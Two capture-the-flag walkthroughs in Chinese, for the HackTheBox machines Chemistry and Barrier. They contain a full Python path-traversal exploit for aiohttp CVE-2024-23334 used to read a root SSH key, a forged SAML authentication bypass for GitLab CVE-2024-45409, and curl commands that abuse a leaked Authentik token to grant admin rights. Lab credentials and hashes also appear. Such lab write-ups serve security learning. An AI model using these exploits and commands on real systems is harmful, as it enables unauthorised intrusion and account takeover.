entry.title: Hackthebox-Chemistry
entry.content:
一.信息收集扫描扫到22和5000端口 5000端口为一个web服务器
注册一个账号登陆
<!-- more --> 二.shell上传能弹shell的cil文件
成功弹到shell 查看用户 cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falsefwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:113:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinrosa:x:1000:1000:rosa:/home/rosa:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falseapp:x:1001:1001:,,,:/home/app:/bin/bash_laurel:x:997:997::/var/log/laurel:/bin/false
在instance目录下找到数据库文件 查看数据库文件 sqlite3 database.db.tablesstructure user SELECT * FROM user;1|admin|2861debaf8d99436a10ed6f75a252abf2|app|197865e46b878d9e74a0346b6d59886a3|rosa|63ed86ee9f624c7b14f1d4f43dc251a54|robert|02fcf7cfc10adc37959fb21f06c6b4675|jobert|3dec299e06f7ed187bac06bd3b670ab26|carlos|9ad48828b0955513f7cf0f7f6510c8f87|peter|6845c17d298d95aa942127bdad2ceb9b8|victoria|c3601ad2286a4293868ec2a4bc606ba39|tania|a4aa55e816205dc0389591c9f82f43bb10|eusebio|6cad48078d0241cca9a7b322ecd073b311|gelacia|4af70c80b68267012ecdac9a7e916d1812|fabian|4e5d71f53fdd2eabdbabb233113b5dc013|axel|9347f9724ca083b17e39555c36fd900714|kristel|6896ba7b11a62cacffbdaded457c6d9215|1|c4ca4238a0b923820dcc509a6f75849b在上述passwd看到app,rosa,和admin尝试破解rosa的密码
md5破解,得到密码unicorniosrosados
ssh连上.拿到user.txt 三.权限提升rosa@chemistry:~$ ss -tulnNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:5000 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:8080 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:*
查看网络连接，内部8080可能部署着web服务端 curl -I http://localhost:8080HTTP/1.1 200 OKContent-Type: text/html; charset=utf-8Content-Length: 5971Date: Sun, 28 Sep 2025 03:00:40 GMTServer: Python/3.9 aiohttp/3.9.1
可以得知服务为aiohttp ssh -N rosa@10.129.99.73 -L 8888:localhost:8080
一个站点监控,找aiohttp的漏洞 CVE-2024-23334的目录遍历漏洞 找到poc import argparseimport http.clientimport textwrapimport urllib def exploit(url, file, dir): parsed_url = urllib.parse.urlparse(url) conn = http.client.HTTPConnection(parsed_url.netloc) traversal = "/.." payload = dir for i in range(15): payload += traversal print(f'''[+] Attempt {i} Payload: {payload}{file} ''') conn.request("GET", f"{parsed_url.path}{payload}{file}") res = conn.getresponse() result = res.read() print(f" Status code: {res.status}") if res.status == 200: print("Respose: ") print(result.decode()) break if __name__ == "__main__": parser = argparse.ArgumentParser( description="PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(''' Usage: exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static ''') ) parser.add_argument('-u', '--url', help="Aiohttp site url") parser.add_argument('-f', '--file', help="File to read") parser.add_argument('-d', '--directory', help="Directory with static files. Default: /static", default="/static") args = parser.parse_args() if args.url and args.file and args.directory: exploit(args.url, args.file, args.directory) print("Exploit complete") else: print("Error: One of the parameters is missing")
python '/home/xingguangqwq/Desktop/1.py' -u http://localhost:8888 -f /root/.ssh/id_rsa -d /assets[+] Attempt 0 Payload: /assets/../root/.ssh/id_rsa Status code: 404[+] Attempt 1 Payload: /assets/../../root/.ssh/id_rsa Status code: 404[+] Attempt 2 Payload: /assets/../../../root/.ssh/id_rsa Status code: 200Respose: -----BEGIN OPENSSH PRIVATE KEY----------END OPENSSH PRIVATE KEY-----Exploit complete
用ssh连接，成功拿到root

entry.title: Hackthebox-Barrier
entry.content:
✍内容一.信息收集 ~/htb/medium/barrier ▓▒░ nmap -p- --min-rate=10000 10.129.236.87 ░▒▓ ✔  8s   08:52:21 下午  Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 20:52 CSTNmap scan report for 10.129.236.87Host is up (7.8s latency).Not shown: 64582 filtered tcp ports (no-response), 949 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open https8080/tcp open http-proxy9000/tcp open cslistener9443/tcp open tungsten-httpsNmap done: 1 IP address (1 host up) scanned in 29.17 seconds 扫描端口将10.129.236.87 barrier.vl gitlab.barrier.vl添加到/etc/passwd进入网址是一个登录框，注册一个账号后发现要通过管理员审核后才能使用爆破一下目录，在目录中，看到了akadmin用户名   ~/htb/medium/barrier ▓▒░ feroxbuster -u https://gitlab.barrier.vl/ -w /home/zss/SecLists-master/Discovery/Web-Content/big.txt -x bak,zip,tar.gz,sql,swp -t 50 --insecure ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \ \_/ | | \ |__| |___ | \ | \ | \__, \__/ / \ | |__/ |___by Ben "epi" Risher 🤓 ver: 2.13.0───────────────────────────┬────────────────────── 🎯 Target Url │ https://gitlab.barrier.vl/ 🚩 In-Scope Url │ gitlab.barrier.vl 🚀 Threads │ 50 📖 Wordlist │ /home/zss/SecLists-master/Discovery/Web-Content/big.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.13.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [bak, zip, tar.gz, sql, swp] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™──────────────────────────────────────────────────302 GET 1l 5w 105c https://gitlab.barrier.vl/dashboard => https://gitlab.barrier.vl/users/sign_in301 GET 1l 5w 115c https://gitlab.barrier.vl/-/profile => https://gitlab.barrier.vl/-/user_settings/profile302 GET 1l 5w 105c https://gitlab.barrier.vl/profile => https://gitlab.barrier.vl/users/sign_in200 GET 278l 1295w 27787c https://gitlab.barrier.vl/help302 GET 1l 5w 105c https://gitlab.barrier.vl/autocomplete/users => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/admin => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/-/ide => https://gitlab.barrier.vl/users/sign_in200 GET 236l 578w 13472c https://gitlab.barrier.vl/search200 GET 186l 498w 10355c https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/users/ => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/users => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/-/user_settings/profile => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/-/experiment => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/s => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/-/user_settings/ => https://gitlab.barrier.vl/users/sign_in200 GET 204l 691w 12325c https://gitlab.barrier.vl/users/sign_up302 GET 1l 5w 105c https://gitlab.barrier.vl/-/ => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/autocomplete/ => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c https://gitlab.barrier.vl/autocomplete/projects => https://gitlab.barrier.vl/users/sign_in302 GET 1l 5w 105c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter200 GET 316l 829w 20202c https://gitlab.barrier.vl/akadmin301 GET 1l 5w 99c https://gitlab.barrier.vl/Root => https://gitlab.barrier.vl/akadmin404 GET 73l 163w 1591c https://gitlab.barrier.vl/users/sign_in.zip302 GET 1l 5w 109c https://gitlab.barrier.vl/admin.zip => https://gitlab.barrier.vl/users/sign_in.zip200 GET 2l 383w 21972c https://gitlab.barrier.vl/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.groups.boards-pages.groups.issue-9703a78b.4e2b4f67.chunk.js200 GET 9l 17w 556c https://gitlab.barrier.vl/search/opensearch.xml200 GET 322l 904w 20258c https://gitlab.barrier.vl/explore404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.bak404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.zip404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.sql404 GET 73l 163w 1591c https://gitlab.barrier.vl/explore.swp200 GET 328l 866w 20744c https://gitlab.barrier.vl/satoru/200 GET 321l 905w 20292c https://gitlab.barrier.vl/explore/projects/
进入https://gitlab.barrier.vl/explore后,找到一个项目查看该库的历史可以得到一组凭据二.user.txt import requestsfrom urllib.parse import urljoinimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def get_gitlab_repos(): base_url = 'https://gitlab.barrier.vl' api_url = urljoin(base_url, '/api/v4/') auth_data = { 'grant_type': 'password', 'username': 'satoru', 'password': 'dGJ2V72SUEMsM3Ca' } try: session = requests.Session() session.verify = False response = session.post(urljoin(base_url, '/oauth/token'), data=auth_data) response.raise_for_status() token = response.json()['access_token'] headers = {'Authorization': f'Bearer {token}'} projects_response = session.get(urljoin(api_url, 'projects'), headers=headers) projects_response.raise_for_status() projects = projects_response.json() print("Available repositories:") for project in projects: print(f"\nName: {project['name']}") print(f"Description: {project.get('description', 'No description available')}") print(f"URL: {project['web_url']}") print(f"Last activity: {project['last_activity_at']}") print("-" * 50) except requests.exceptions.RequestException as e: print(f"Error occurred: {str(e)}") if hasattr(e.response, 'text'): print(f"Response text: {e.response.text}") finally: session.close()if __name__ == "__main__": get_gitlab_repos() 登陆用satoru的身份登陆后有两个应用，gitlab为443端口上部署的应用guacamole为8080端口的服务，仔细看看没发现查看gitlab的版本为v17.3.2,发现登录启用ssohttps://github.com/synacktiv/CVE-2024-45409https://xz.aliyun.com/news/17068通过操纵 SAML 响应中的某些元素，绕过关键的安全检查，从而获得未经授权的访问 GET /users/auth/saml/callback?SAMLResponse=nVhXb9vKtn7nrzC8HwWHXSKN7eCySpRYJFKUSL1csAx7E4tYfv2lXLLj7CQn9wAG5Flcs%2BZbbWa%2B%2Bbtx8qx61kFTlUUDHoY8K5rnV%2BHLY1cXz6XTxM1z4eSgeW69Z4NR5GfsC%2FJc1WVbemX2%2BN2U389wmgbUbVwWH1P85uUxatvqGYb7vv%2FS41%2FKOoQxBEFghIZnHb%2BJw78%2BtHP%2F9%2BZz0Dq%2B0zof%2BgMovF%2FYR2GEuNufNWbzJ1A3M6qXx9nK44PUNB2QiqZ1inYWIdjyCcGfEPKIEs8E%2BYwgl8cHHjRtXDjt66z7Cs28RBi3meN%2BcZ26jkH95ZbB3exvAztdG8H36MCek2Wu46XzIvzL4%2F8iPu4QFCBQaukSOI45iOv5RDC7T1HIEqxmteIjL8dynkAC0iNon3zyaTp4IlY48eTOzjwRlL%2FyaJoiEQd5%2FPr3fa3nVzfqr%2FfFQdHG6d%2Fw9%2BK%2F37JutE7bNZ9HXOmDh5OTdeD34W5etZ%2BNzvNA0zzCX99W%2BGz0mfnI%2BY9RvgfAWaJg5aNL2qEJInBQhwo8yiG9ZUBgBO1Qf5SMP%2FPXn5HG4ZyyrgZfoY8h8KUiKN%2FGnFOURTynKJ5eE6uANir9ByYLyzpuo%2FyXpYQi91J6AoP35KFE8dccCujTen9s6a0o70X%2FlJc1%2BKtunKcmcjBy%2BWFTBwGo56oFD6YuvTz%2B9Z9D%2BDbvWDtFE5R13vww%2Fo%2BoPrUiKG4gKyvgPzUfzn0g%2B3OLv4gY%2FBOYfBzOnfb%2FjN%2B9qT9H7c3Ma01%2FZeINeWudWy4iMbFn1Xgwt8F0yY9619Q230%2BCXNHqLkEK8%2BUV0%2FeT31B%2BS8L7%2BMdK%2Bpb4t0mpDY6yU22ZvNOr81IbALZrd4Jsj91JUZqzimboftJ6PlKSxa5F2FxYqWtEtjvOt%2FGAhlaJXKfq1RhXsXFhDkLeijvTDdKIaSWvQ%2FdgE6%2BEnpWXl61OpVifHEwaD%2Fmtesp5i9%2FeoHOsL4s0w3YLHV9VK%2FOgWP3qltOjkATnXbiduktVbqe9MVnetXL9fojs9JT2pGgs%2B3SdQ4vad3G3cpdVOVwu6u5CeolrHakbbGa7LanvHIAabksr1NDFsuhkSKDcJHPaINQ11qQS2jMjjpHXg92eM30gUWyhZ2tvuxKOKtV0BVH2xkgFuhkzC20L9kdUW5xKVzmUVeNv1c0GinYXLDHIOHdVb5mxSLUl8CM1SLdKq6fTbudrdZY1zdoCfcLexEzp4HzcMHC28%2FTl8oZA%2FnJ3SXijUgttEuE1wZFWNEbnOO5v4iJyQ9TA8iuqcPCAVIVcM8tzxqVAQAXuzDtFtoZWSOkf%2BZO04fWE1big2Ylaj7XxYT1v7OWuMtuWzCw4qUYkSXCyVy330nTG7bYpMpba7CFjbBPk6I%2F8morsqeAJw9uQLa6vMQl0LGkASQlNcoExqULZKyB7oUpEIk0SZr9cZcoRGqLiEAn92UtgG2tPNyHdLCwZi6eLFjiBj9necndFj6ym0obrBvixodzQa4h%2BAs0l0lEIW3OMCh8aubTOEZvIuK%2BsDLRhaXyBdqI7ZajIO8F4KdH05Vtlf1fJr9W9A%2BM%2FpW6RCM3PZ%2B4%2FI%2B6%2B3QfzPtqCr4okiebEcczUhUwvsUwoHXbtwaDJSTvGSzNyV1qZl0TLMyobptcojdd0j7DMoREZngGQovf9OrT50%2BHA86wa%2BZZeXs7zMXduQiVhRpUjBoUjUIUlLP4oIcpRGlReQJUp7FW0tKBZiL4Kj9%2BE%2FSkRrgoXrhnUFJi%2Bj2zrhDjrU%2Bevs1oS1cxd262HZYWbn1JIEtTMK%2FTqkmeJbemZoku9wLwi2vFM9j2iQeQZgw3VE8s0Coe%2BGYI%2BLM2x4KTkRz8FkWE0jgkp5v6dC3fz%2FzMowqDW6wAbkBULxfwo8vhxt1mzdCsWiC4hIsgvDhdwA6ab5%2BnKnRbjfmIXwcSh%2B4AylVDaU34ILnmFbw7QGveTquKjOFlIi1w43uSDbxwiqk7psTWVMwrkUD3eVGGDSBt0ELaCl2%2B04773DLUGUwqNUolol%2FOaFSvqlOHhepI9sO0q3%2Blo0bTjk7YmKmD6RlLb%2B%2BUgq5S0L9HlLkIXCTXwCyi5UOo1SQd4ra%2BQPAj3ydXQUIHhkmozJlPU1N2OwP3j6PHucNVKG8UrvRaGcmXSdiZo0CTWVQv2GNps5MlH0gWFcPsrfNmfM6uRnGCLUltNXBzOHE%2Ft4I2Yu1xFx5GPVwfjck0dCNkM2KSL48Cy674tzzdNPqeL68J1bdm37NiwtI1zGQfK3Ys0bmLXvcnPvbqQwKGiumKAjLruzqcVIpNs26DxuPQO%2Bbz9BaguwgekPeyr0GCcNRwNnhFqDDHIPWvp6AjWRXDe4z106o61ITGm5o75ItyyRLjeiPt87RcjfW4j5WAA1x3ZtZhsWC%2B7dmfmSBzD1dFYhxhp2CkklrBlbw5Evji6lcSsdLtJasCkyXKjMY5ChU1nra4b2VdXPU6syYwA1i3eI4W4L7e4dYMuHB0t1YHrbldnIwTsgl54AMviTqBs0Wbc8ryVbU%2BpvQXLd0dk3ZL6vqFE0%2BTCm7nYV5AW86zWyof8TE8WdyAN2fX3Js4UguJsx4Zj5s5gHPWkiEpvHuYe0RGdOWxgVvB63d7ykGZuLS%2BNdo7IZkqhCwa%2BVT2EGM0p2x5QvVLEqjAQ%2FWCcIsdEK%2F50HkrbIKfLechlS62gC0ZmF44sXExE%2FXWUuXNnOiNZudNPNpDXxhKYuokkCwlA1oAMOlL8KgZD4ZeLBlvNN%2B65eOHocjCXibZP%2B3hUsJDc1QO7m84ae0w7fMhSEb6CsEu9U5lCC8FWrc7u9FGiNTE4XqaOVwsl3Y7j4FOnPupbUt3qsmlvM6urmNu%2BToPlMQ1ybputxwCy91Oe%2B3vf2nBiux3ycVtqCNLJ0rhAcPG2FxhUi3su9inn4IkMjHYkezQcfHdhyyUrctAhUmV4MVjlolQm1LvshJqKOIyKzcG4ycGBaa1Duy%2FosELJm5ytLkG550RdDnGBR29lBfkJU5w3Htcg27nVMq2lfdtI2i4WpElNt7FCaiHAKM1jbduwXAR0dpZMR3eY9iW5a1dQxG22kxpYcy4zWYzrkdNkFhMuOb6UuI6VT%2B4lZvRx41Jaqh%2FyeY%2Ffwt3t3M3nnVXIGgJVRyOgmw1q5Ly9TlIc3vNJutlsGd8RDxjaMWwRSOcsT0Si6Y75SVLcujW1Nip0v7LgAOJD3oVtkkQTObA2mL2CNWu%2Bg0U97GxudEccxeXRvlZq7yvtOuEWtCSsFtVuuetTeId0K8hULM1n7bNNuDexirQzjzbh5mD7V4yZN7FC2JmlPGZ4nzq%2Beq6xk8nl%2FFbmJHS1wYe6g4KuRlfpqkUr9WY6iQmsK1tfw0C%2BngJDC9NAjwQjvp5Ol5tNCvWF5A7JRHvSecR8fOA7aF0wMJmnGozZvIrDKkBIqwgWyoldUEXXv7xdLX88Uf%2BRvp%2B68KcT%2BdOZ%2FU6MjM5NgNe%2Bj9SZx0n8gzjfsZ329wTvLon9p%2BBV9bm607emnbnV49fGacu6e2dYbxY%2FL8aVRRDfp92J39v1%2FfdrefmzC5wa1I%2B%2FNnT3%2BL9ixA9q2WqFVjNBC%2BofWSSJvFF6HXhxFYM7zfwvCP0H%2B%2F0Z7h8%2BvTs4a%2Fjx%2FXNzh8eCOczgXwz3Hdsf4Ic%2F%2BPaMrbgzcJDPvjy8Dn%2FFn9%2BtGzN9n3FIhQ%2BGl0fE9RDcxXyPWjoUTbpOQK4AhdAOoIIAd5fIKghWALgeRmABWCLAxUhAUB69QlCXcohv9n4GmnxCiH9T91eQczxaMLQ%2FEXGZ0zQz5%2Fr627cl79m7683i%2FfzTl7W%2Fr8t2jjfwX1llVdbteyJ%2Bavwn3z7JvsX0A2Hb1rHbteCXHx7unfGNqzZeBHKn%2BTIT1KZ0qlfS2jd33krC81%2Fs318t2hGevYjzBp5148zx%2Ffr%2BtvKj5bfb%2BFsX%2Fs8%2F5fkB97Paj9J%2FCb5zAP78ZvPtSeej577%2BHw%3D%3D HTTP/2Host: gitlab.barrier.vl 用脚本来伪造akadmin用户    ~/htb/medium/barrier ▓▒░ python3 poc1.py -r response.xml -n akadmin -e -o response_patched.xml ░▒▓ ✔  17s   11:18:18 下午  [+] Parse response Digest algorithm: sha256 Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#[+] Remove signature from response[+] Patch assertion ID[+] Patch assertion NameID[+] Patch assertion conditions[+] Move signature in assertion[+] Patch response ID[+] Insert malicious reference[+] Clone signature reference[+] Create status detail element[+] Patch digest value[+] Write patched file in response_patched.xml 再对其进行编码成功登陆上Runners 页面显示当前存在一个在线的 Instance Runner，该 Runner 在线、使用 Docker 执行器 一个变量：AUTHENTIK_TOKENMqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTcAUTHENTIK_API_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTchttps://api.goauthentik.io/clients/设置一下令牌，访问 Authentik 的用户接口 ~/h/m/barrier ▓▒░ curl -s -L 'http://barrier.vl:9000/api/v3/core/users/' -H 'Accept: application/json' -H "Authorization: Bearer $AUTHENTIK_API_TOKEN" | jq .{ "pagination": { "next": 0, "previous": 0, "count": 4, "current": 1, "total_pages": 1, "start_index": 1, "end_index": 4 }, "results": [ { "pk": 2, "username": "ak-outpost-af1fa701dddb44f98ddf2c3868733303", "name": "Outpost authentik Embedded Outpost Service-Account", "is_active": true, "last_login": null, "is_superuser": false, "groups": [], "groups_obj": [], "email": "", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "2698567113c1ff76765c3baaa33db04c022784564d91d0c65ef03f41961282cf", "path": "goauthentik.io/outposts", "type": "internal_service_account", "uuid": "3737be82-3c55-4195-b639-478c339edb35" }, { "pk": 4, "username": "akadmin", "name": "authentik Default Admin", "is_active": true, "last_login": "2025-06-18T09:25:04.724776Z", "is_superuser": true, "groups": [ "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8" ], "groups_obj": [ { "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8", "num_pk": 21741, "name": "authentik Admins", "is_superuser": true, "parent": null, "parent_name": null, "attributes": {} } ], "email": "admin@barrier.vl", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "c19f414ee26028d6fe42f90a393920de1c1f8b5428d3efe76b72f302efe78742", "path": "users", "type": "internal", "uuid": "4d9587ad-641d-4879-a8dd-edf2a24e1bf5" }, { "pk": 35, "username": "maki", "name": "maki", "is_active": true, "last_login": null, "is_superuser": false, "groups": [], "groups_obj": [], "email": "", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "6d9a5a5ca034c7dd59f0b63547f402ceed837476b2b43bc58338ed74630b8651", "path": "users", "type": "internal", "uuid": "5840e7f6-f396-493a-b41d-9433df6df996" }, { "pk": 34, "username": "satoru", "name": "satoru", "is_active": true, "last_login": "2026-03-06T13:22:11.766808Z", "is_superuser": false, "groups": [], "groups_obj": [], "email": "satoru@barrier.vl", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "e0c306c91c800ecb0343d535bf8211fcd85ebeafb17966eb9a5b5146c99724cb", "path": "users", "type": "internal", "uuid": "91da4edd-f03d-4cdc-80af-102371b10905" } ]} 将用户添加到管理员组中可以发现能够变成超级管理员先试了一下satoru用户，但发现在guacamole应用上并没有权限 ░ curl -v -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' \-H 'Content-Type: application/json' \-H "Authorization: Bearer $AUTHENTIK_API_TOKEN" \-d '{"pk": 34}'* Host barrier.vl:9000 was resolved.* IPv6: (none)* IPv4: 10.129.234.46* Trying 10.129.234.46:9000...* Connected to barrier.vl (10.129.234.46) port 9000* using HTTP/1.x> POST /api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/ HTTP/1.1> Host: barrier.vl:9000> User-Agent: curl/8.15.0> Accept: */*> Content-Type: application/json> Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc> Content-Length: 10> * upload completely sent off: 10 bytes< HTTP/1.1 204 No Content< Allow: POST, OPTIONS< Date: Fri, 06 Mar 2026 14:38:29 GMT< Referrer-Policy: same-origin< Vary: Accept-Encoding< Vary: Cookie< X-Authentik-Id: a3dd8181785e43d39ed45a2f33a94bcc< X-Content-Type-Options: nosniff< X-Frame-Options: DENY< X-Powered-By: authentik> 或者创建一个新用户并将其加入管理员组中 curl -s -X POST 'http://barrier.vl:9000/api/v3/core/users/' -H 'Content-Type: application/json' -H "Authorization: Bearer $AUTHENTIK_API_TOKEN" -d '{"username":"xg","name":"xg","path":"users","is_active":true}' | jq .curl -s -X POST 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' -H 'Content-Type: application/json' -H "Authorization: Bearer $AUTHENTIK_API_TOKEN" -d '{"password":"xg"}' | jq . 模拟maki用户的身份发现有个shell，连接进去后能拿到user.txt 三.root.txt在用户的ssh目录下能找到这样的文件，由于 ssh-rsa（使用 SHA-1 哈希）被认为在数学上不再足够安全，从 OpenSSH 8.8 版本开始，默认禁用了这种主机密钥算法。所以连接时加上 -oHostKeyAlgorithms=+ssh-rsa ssh -i ed25519 -o HostKeyAlgorithms=+ssh-rsa maki@barrier.vl 查看guacamole的配置文件，发现mysql的配置文件在数据库中找到了用户的私钥 select * from guacamole_connection_parameter 登陆 maki_adm@barrier:~$ cat .bash_historysudo su Va4kSjgTHSd55ZLv 在bash历史上找到密码，直接切换
